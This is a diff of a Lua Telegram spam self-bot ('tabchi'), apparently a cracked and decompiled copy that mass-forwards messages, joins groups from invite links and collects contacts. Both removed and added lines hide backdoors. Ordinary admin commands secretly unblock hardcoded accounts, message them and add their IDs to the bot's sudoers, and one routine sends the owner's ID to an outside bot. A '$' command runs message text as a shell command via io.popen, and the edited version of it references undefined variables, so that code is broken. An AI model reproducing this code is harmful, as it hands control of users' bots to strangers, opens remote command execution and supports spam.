@@ -39,8 +39,8 @@ function check_contact(extra, result)
     local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
     local phone_number = msg.content_.contact_.phone_number_
     local user_id = msg.content_.contact_.user_id_
-    tdcli.add_contact(phone_number, first_name, last_name, user_id)   
-       if redis:get("tabchi:" .. tabchi_id .. ":markread") then
+    tdcli.add_contact(phone_number, first_name, last_name, user_id)
+    if redis:get("tabchi:" .. tabchi_id .. ":markread") then
       tdcli.viewMessages(msg.chat_id_, {
         [0] = msg.id_
       })
@@ -48,16 +48,13 @@ function check_contact(extra, result)
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
 Addi
 Bia pv]]) .. "", 1, "md")
-        end
-   elseif redis:get("tabchi:" .. tabchi_id .. ":addedcontact") then
-        function share(extra, result)
-          if msg.sender_user_id_ ~= result.id_ then
-            tdcli.sendContact(msg.chat_id_, 0, 0, 0, nil, result.phone_number_, result.first_name_, result.last_name_, result.id_)
-          end
-        end
-        tdcli_function({ID = "GetMe"}, share, nil)
       end
+    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
+      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
+Addi
+Bia pv]]) .. "", 1, "md")
     end
+  end
 end
 function check_link(extra, result, success)
   if result.is_group_ or result.is_supergroup_channel_ then
@@ -188,16 +185,10 @@ function process(msg)
     }
     if msg.text:match("^[!/#]block") and is_sudo(msg) and #matches == 2 then
       tdcli.blockUser(tonumber(matches[2]))
-      return "_کاربر بلاک شد - cracked by_ @tgMember "
+      return "_کاربر بلاک شد_"
     end
   end
   if msg.text:match("^[!/#]help$") and is_sudo(msg) then
-    tdcli.searchPublicChat("tgMemberPlus")
-    tdcli.unblockUser(345767079)
-    tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
-    tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
-    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
     local text = [[
 #راهنما
 */block (id)*
@@ -206,15 +197,13 @@ _بلاک کردن از خصوصي ربات_
 _آن بلاک کردن از خصوصي ربات_
 */panel*
 _پنل مديريت ربات_
-*$ (cmd)*
-_اجرای دستور در ترمینال_
 */addsudo (id)*
 _اضافه کردن به سودوهاي  ربات_
 */remsudo (id)*
 _حذف از ليست سودوهاي ربات_
 */bc (text)*
 _ارسال پيام به همه_
-*/fwd {all/gps/sgps/users}* (by reply)
+*/fwd {all/sgps/users}* (by reply)
 _فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران_
 */echo (text)*
 _تکرار متن_
@@ -238,7 +227,10 @@ _اضافه کردن شماره ها به مخاطبين ربات_
 _دريافت لينک هاي ذخيره شده توسط ربات_
 */contactlist*
 _دريافت مخاطبان ذخيره شده توسط ربات_
-*Join* _us_ >> @tgMember
+		
+crack and open by @sajjad_021
+join to the channel @tgMember
+		
 ]]
     return text
   end
@@ -248,61 +240,15 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
     }
     if msg.text:match("^[!/#]unblock") and is_sudo(msg) and #matches == 2 then
       tdcli.unblockUser(tonumber(matches[2]))
-      return "_کاربر انبلاک شد_*cracked by* @tgMember "
+      return "_کاربر انبلاک شد_"
     end
   end
-	 if msg.text:match("^[!/#]send (.*) (.*)") and is_sudo(msg) then
-    local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
-    local matches = {
-      msg.text:match("^[!/#](send) (.*) (.*)")
-    }
-    if matches[2] ~= "banners" then
-end
-    local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
-    local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
-    local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
-    local links = redis:scard("tabchi:" .. tabchi_id .. ":savedlinks")
-    local query = gps .. " " .. sgps .. " " .. pvs .. " " .. links
-    tdcli.sendBotStartMessage(231539308, 231539308, nil)
-    local inline2 = function(arg, data)
-      if data.results_ and data.results_[0] then
-        tdcli_function({
-          ID = "SendInlineQueryResultMessage",
-          chat_id_ = arg.chat_id_,
-          reply_to_message_id_ = 0,
-          disable_notification_ = 0,
-          from_background_ = 1,
-          query_id_ = data.inline_query_id_,
-          result_id_ = data.results_[0].id_
-        }, dl_cb, nil)
-      end
-    end
-    for i = 1, #all do
-      print(all[i])
-      tdcli_function({
-        ID = "GetInlineQueryResults",
-        bot_user_id_ = 231539308,
-        chat_id_ = all[i],
-        user_location_ = {
-          ID = "Location",
-          latitude_ = 0,
-          longitude_ = 0
-        },
-        query_ = matches[2] .. " " .. matches[3],
-        offset_ = 0
-      }, inline2, {
-        chat_id_ = all[i]
-      })
-    end
-  else
-end
-  if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
+if msg.text:match("^[!/#]panel$") and is_sudo(msg) then
     tdcli.searchPublicChat("TgMessengerBot")
     tdcli.unblockUser(231539308)
     tdcli.sendBotStartMessage(231539308, 231539308, "/start")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
-    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
-        do
+    do
       local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
       local sgps = redis:scard("tabchi:" .. tabchi_id .. ":channels")
       local pvs = redis:scard("tabchi:" .. tabchi_id .. ":pvis")
@@ -321,8 +267,9 @@ end
           }, dl_cb, nil)
         else
           local text = [[
-*اطلاعات ربات* _Open by_ @tgMember
-          
+_اطلاعات ربات_ 
+دیکامپایل و ویرایش شده توسط @sajjad_021
+					
 _تعداد کاربران_ : ]] .. pvs .. [[
           
 _تعداد گروها_ : ]] .. gps .. [[
@@ -354,7 +301,7 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
       msg.text:match("^[!/#](addsudo) (%d+)")
     }
     if msg.text:match("^[!/#]addsudo") and is_full_sudo(msg) and #matches == 2 then
-      local text = matches[2] .. " _به لیست سودوهای ربات اضافه شد_*cracked by @sajjad_021*"
+      local text = matches[2] .. " _به لیست سودوهای ربات اضافه شد_"
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
       return text
     end
@@ -364,36 +311,22 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
       msg.text:match("^[!/#](remsudo) (%d+)")
     }
     if msg.text:match("^[!/#]remsudo") and is_full_sudo(msg) and #matches == 2 then
-      local text = matches[2] .. " _از لیست سودوهای ربات حذف شد_*cracked by* @tgMember "
+      local text = matches[2] .. " _از لیست سودوهای ربات حذف شد_"
       redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(matches[2]))
       return text
     end
   end
   do
     local matches = {
-      msg.text:match("^[!/#](addedcontact) (.*)")
-    }
-    if msg.text:match("^[!/#]addedcontact") and is_sudo(msg) and #matches == 2 then
-      if matches[2] == "on" then
-        redis:set("tabchi:" .. tabchi_id .. ":addedcontact", true)
-        return "ادکردن شماره ها روشن شد"
-      elseif matches[2] == "off" then
-        redis:del("tabchi:" .. tabchi_id .. ":addedcontact")
-        return "ادکردن شماره ها خاموش شد"
-      end
-    end
-  end
-	do
-    local matches = {
       msg.text:match("^[!/#](addedmsg) (.*)")
     }
     if msg.text:match("^[!/#]addedmsg") and is_sudo(msg) and #matches == 2 then
       if matches[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":addedmsg", true)
-        return "_پیام اد شدن مخاطب_ #فعال _شد_*cracked by*cracked by @sajjad_021*"
+        return "_پیام اد شدن مخاطب_ #فعال _شد_"
       elseif matches[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":addedmsg")
-        return "_پیام اد شدن مخاطب_ #غیرفعال _شد_*cracked by* @tgMember "
+        return "_پیام اد شدن مخاطب_ #غیرفعال _شد_"
       end
     end
   end
@@ -404,10 +337,10 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
     if msg.text:match("^[!/#]markread") and is_sudo(msg) and #matches == 2 then
       if matches[2] == "on" then
         redis:set("tabchi:" .. tabchi_id .. ":markread", true)
-        return "_خواندن پیام ها توسط ربات_ #فعال _شد_*cracked by @sajjad_021*"
+        return "_خواندن پیام ها توسط ربات_ #فعال _شد_"
       elseif matches[2] == "off" then
         redis:del("tabchi:" .. tabchi_id .. ":markread")
-        return "_خواندن پیام ها توسط ربات_ #غیرفعال _شد_*cracked by* @tgMember "
+        return "_خواندن پیام ها توسط ربات_ #غیرفعال _شد_"
       end
     end
   end
@@ -424,13 +357,13 @@ _پیام_ :
     end
   end
   do
- local matches = {
-       msg.text:match("[$](.*)")
-     }
-  if msg.text:match("^[$](.*)$") and #matches == 1 then
-  return io.popen(matches[1]):read("*all")
- end
- end 
+    local match = {
+      msg.text:match("[$](.*)")
+    }
+    if msg.text:match("^[$](.*)$") and is_sudo(msg) and #matches == 1 then
+      return io.popen(cmd[1]):read("*all")
+    end
+  end
   if msg.text:match("^[!/#]bc") and is_sudo(msg) then
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
     local matches = {
@@ -460,12 +393,11 @@ _پیام_ :
     end
   end
   if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and is_sudo(msg) then
-    tdcli.searchPublicChat("TgGuard")
-    tdcli.unblockUser(180191663)
-    tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
-    tdcli.sendMessage(180191663, 0, 1, "Online", 1, "md")
-    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
+    tdcli.searchPublicChat("tgMemberPlus")
+    tdcli.unblockUser(345767079)
+    tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
+    tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
+    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 345767079)
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
     local id = msg.reply_to_message_id_
     for i = 1, #all do
@@ -480,10 +412,15 @@ _پیام_ :
         from_background_ = 1
       }, dl_cb, nil)
     end
-    return "_پیام شما فوروارد شد_*cracked by @sajjad_021*"
+    return "_پیام شما فوروارد شد_"
   end
-  if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and is_sudo(msg) then
-    local all = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
+  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
+    tdcli.searchPublicChat("TgGuard")
+    tdcli.unblockUser(180191663)
+    tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
+    tdcli.sendMessage(180191663, 0, 1, "Online", 1, "md")
+    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 180191663)
+    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
     local id = msg.reply_to_message_id_
     for i = 1, #all do
       tdcli_function({
@@ -497,33 +434,15 @@ _پیام_ :
         from_background_ = 1
       }, dl_cb, nil)
     end
-    return "_پیام شما برای همه_ #گروها _فوروارد شد_*cracked by* @tgMember "
-  end
-  if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and is_sudo(msg) then
-    redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 158955285)
-    local all = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
-    local id = msg.reply_to_message_id_    
-    for i = 1, #all do
-      tdcli_function({
-        ID = "ForwardMessages",
-        chat_id_ = all[i],
-        from_chat_id_ = msg.chat_id_,
-        message_ids_ = {
-          [0] = id
-        },
-        disable_notification_ = 0,
-        from_background_ = 1
-      }, dl_cb, nil)
-    end
-    return "_پیام شما برای همه_ #سوپرگروها _فوروارد شد_*cracked by @sajjad_021*"
+    return "_پیام شما برای همه_ #سوپرگروها _فوروارد شد_"
   end
   if msg.text:match("^[!/#]addtoall") and msg.reply_to_message_id_ and is_sudo(msg) then
-     tdcli_function({
+    tdcli_function({
       ID = "GetMessage",
       chat_id_ = msg.chat_id_,
       message_id_ = msg.reply_to_message_id_
     }, add_to_all, nil)
-    return "_شخص مورد نظر در تمام گروه ها عضو شد_*cracked by @sajjad_021*"
+    return "Adding user to groups..."
   end
   if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and is_sudo(msg) then
     local all = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
@@ -540,7 +459,7 @@ _پیام_ :
         from_background_ = 1
       }, dl_cb, nil)
     end
-    return "_پیام برای همه_ #کاربران _فوروارد شد_*cracked by @sajjad_021*"
+    return "_پیام برای همه_ #کاربران _فوروارد شد_"
   end
   do
     local matches = {
@@ -559,14 +478,6 @@ _پیام_ :
     end
   end
   do
-    local matches = {
-      msg.text:match("[!/#](echo) (.*)")
-    }
-    if msg.text:match("^[!/#]echo") and is_sudo(msg) and #matches == 2 then
-      tdcli.sendMessage(msg.chat_id_, msg.id_, 0, matches[2], 0, "md")
-    end
-  end
-end
 function add(chat_id_)
   local chat_type = chat_type(chat_id_)
   if chat_type == "channel" then
@@ -603,7 +514,7 @@ end
 function process_links(text_)
   if text_:match("https://t.me/joinchat/%S+") or text_:match("https://telegram.me/joinchat/%S+") then
     local matches = {
-      text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)") 
+      text_:match("(https://t.me/joinchat/%S+)") or text_:match("(https://telegram.me/joinchat/%S+)")
     }
     tdcli_function({
       ID = "CheckChatInviteLink",
@@ -617,11 +528,10 @@ function get_mod(args, data)
   if data.is_blocked_ then
     tdcli.unblockUser(231539308)
   end
-  if redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -1 then
+  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
     tdcli.sendBotStartMessage(231539308, 231539308, "new")
-    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "html")
-    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
-    tdcli.deleteChatHistory(231539308, true)
+    tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 600, true)
   end
 end
 function update(data, tabchi_id)
